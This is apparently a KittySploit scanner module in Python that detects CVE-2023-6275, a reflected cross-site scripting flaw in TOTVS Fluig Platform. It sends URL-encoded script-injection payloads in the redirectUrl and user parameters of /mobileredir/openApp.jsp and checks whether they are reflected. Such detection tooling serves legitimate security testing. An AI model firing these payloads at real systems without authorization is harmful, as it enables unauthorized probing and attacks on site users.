#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in TOTVS Fluig Platform 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TOTVS Fluig Platform - Cross-Site Scripting Detection',
        'description': 'A vulnerability was found in TOTVS Fluig Platform 1.6.x/1.7.x/1.8.0/1.8.1. It has been rated as problematic. Affected by this issue is some unknown functionality of the file /mobileredir/openApp.jsp of the component mobileredir. The manipulation of the argument redirectUrl/user with the input "><script>alert(document.domain)</script> leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'fluig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/erickfernandox/CVE-2023-6275',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-6275',
            'https://vuldb.com/?id.246104',
        ],
        'cve': 'CVE-2023-6275',
    }

    def run(self):
        for path in ('/mobileredir/openApp.jsp?redirectUrl=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', '/mobileredir/openApp.jsp?user=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
            body_all = ('"><script>alert(document.domain)</script>', 'fluig://',)
            ctype_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
                self.set_info(
                    severity='medium',
                    reason='TOTVS Fluig Platform - Cross-Site Scripting detected',
                    path=path,
                )
                return True
        return False

